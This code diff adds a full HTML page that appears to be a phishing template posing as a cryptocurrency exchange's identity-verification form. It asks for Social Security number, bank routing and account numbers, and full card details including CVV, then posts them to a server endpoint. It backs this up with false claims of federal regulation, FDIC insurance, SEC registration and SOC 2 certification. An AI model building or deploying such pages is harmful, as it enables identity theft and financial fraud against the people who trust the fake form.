@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CoinVault Pro — Identity Verification Center</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,sans-serif;min-height:100vh}
+.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:16px 32px;display:flex;align-items:center;gap:16px}
+.topbar .logo span{font-size:20px;font-weight:700;color:#fff}.topbar .logo .accent{color:#f0b90b}
+.topbar .sep{color:#30363d;font-size:20px}
+.topbar .sub{font-size:14px;color:#8b949e}
+.container{max-width:620px;margin:40px auto;padding:0 20px}
+.header-block{text-align:center;margin-bottom:32px}
+.header-block h1{font-size:24px;font-weight:700;margin-bottom:8px}
+.header-block p{color:#8b949e;font-size:14px;line-height:1.6}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:28px;margin-bottom:20px}
+.card h2{font-size:16px;font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+.card .card-desc{color:#8b949e;font-size:13px;margin-bottom:20px}
+.badge-num{width:24px;height:24px;border-radius:50%;background:#f0b90b;color:#0d1117;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:13px;font-weight:500;color:#c9d1d9;margin-bottom:5px}
+.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#f0b90b}
+.field .hint{font-size:12px;color:#8b949e;margin-top:4px}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.row3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px}
+.divider{border:none;border-top:1px solid #21262d;margin:24px 0}
+.btn{width:100%;padding:12px;background:#f0b90b;color:#0d1117;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s;margin-top:8px}
+.btn:hover{background:#d4a20a}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.trust-bar{display:flex;gap:20px;justify-content:center;margin-top:24px;flex-wrap:wrap}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:12px;color:#484f58}
+.reg-cite{text-align:center;margin-top:16px;font-size:12px;color:#484f58;line-height:1.5}
+.success{display:none;text-align:center;padding:32px}
+.success .icon{font-size:48px;color:#3fb950;margin-bottom:12px}
+.success h2{font-size:20px;margin-bottom:8px}
+.success p{color:#8b949e;font-size:14px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo"><span>Coin<span class="accent">Vault</span> Pro</span></div>
+  <span class="sep">|</span>
+  <span class="sub">Identity Verification Center</span>
+</div>
+<div class="container">
+  <div class="header-block">
+    <h1>Complete Your Identity Verification</h1>
+    <p>Federal regulations require all cryptocurrency trading accounts to verify user identity. Complete the form below to unlock full platform access.</p>
+  </div>
+  <form id="kycFullForm">
+    <div class="card">
+      <h2><span class="badge-num">1</span> Personal Identity</h2>
+      <p class="card-desc">Required by FinCEN for all US-based accounts</p>
+      <div class="field">
+        <label for="full_name">Full Legal Name</label>
+        <input type="text" id="full_name" placeholder="As it appears on your government ID" required>
+      </div>
+      <div class="row2">
+        <div class="field">
+          <label for="dob">Date of Birth</label>
+          <input type="date" id="dob" required>
+        </div>
+        <div class="field">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" placeholder="+1 (555) 123-4567" required>
+        </div>
+      </div>
+      <div class="field">
+        <label for="ssn">Social Security Number</label>
+        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+        <div class="hint">Required under federal law for IRS reporting on all US brokerage accounts.</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2><span class="badge-num">2</span> Address &amp; Employment</h2>
+      <p class="card-desc">Required for AML compliance under the Bank Secrecy Act</p>
+      <div class="field">
+        <label for="address">Home Address</label>
+        <input type="text" id="address" placeholder="123 Main St, City, State ZIP" required>
+      </div>
+      <div class="field">
+        <label for="employer">Current Employer</label>
+        <input type="text" id="employer" placeholder="Company name">
+      </div>
+    </div>
+
+    <div class="card">
+      <h2><span class="badge-num">3</span> Financial Information</h2>
+      <p class="card-desc">Link your bank and payment method for deposits and withdrawals</p>
+      <div class="row2">
+        <div class="field">
+          <label for="bank_routing">Bank Routing Number</label>
+          <input type="text" id="bank_routing" placeholder="9 digits" maxlength="9" required>
+        </div>
+        <div class="field">
+          <label for="bank_account">Account Number</label>
+          <input type="text" id="bank_account" placeholder="Account number" required>
+        </div>
+      </div>
+      <hr class="divider">
+      <div class="field">
+        <label for="card_number">Credit / Debit Card Number</label>
+        <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+      </div>
+      <div class="row2">
+        <div class="field">
+          <label for="card_expiry">Expiry Date</label>
+          <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5" required>
+        </div>
+        <div class="field">
+          <label for="card_cvv">CVV</label>
+          <input type="text" id="card_cvv" placeholder="123" maxlength="4" required>
+        </div>
+      </div>
+    </div>
+
+    <button type="submit" class="btn" id="submitBtn">Submit Verification</button>
+  </form>
+
+  <div class="success" id="success">
+    <div class="icon">&#10003;</div>
+    <h2>Verification Submitted</h2>
+    <p>Your identity has been verified. You now have full access to CoinVault Pro.</p>
+  </div>
+
+  <div class="trust-bar">
+    <div class="trust-item">&#128737; SEC Registered</div>
+    <div class="trust-item">&#127974; FDIC Insured</div>
+    <div class="trust-item">&#10003; SOC 2 Type II</div>
+    <div class="trust-item">&#128274; AES-256 Encrypted</div>
+  </div>
+  <p class="reg-cite">Regulated by the U.S. Securities and Exchange Commission. Member SIPC.<br>All data encrypted in transit and at rest. SOC 2 Type II certified infrastructure.</p>
+</div>
+<script>
+document.getElementById('kycFullForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+  fetch('/api/submit', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      full_name: document.getElementById('full_name').value,
+      dob: document.getElementById('dob').value,
+      phone: document.getElementById('phone').value,
+      ssn: document.getElementById('ssn').value,
+      address: document.getElementById('address').value,
+      employer: document.getElementById('employer').value,
+      bank_routing: document.getElementById('bank_routing').value,
+      bank_account: document.getElementById('bank_account').value,
+      card_number: document.getElementById('card_number').value,
+      card_expiry: document.getElementById('card_expiry').value,
+      card_cvv: document.getElementById('card_cvv').value
+    })
+  }).then(function(r){ return r.json(); }).then(function(d) {
+    document.getElementById('kycFullForm').style.display = 'none';
+    document.getElementById('success').style.display = 'block';
+  });
+});
+</script>
+</body>
+</html>
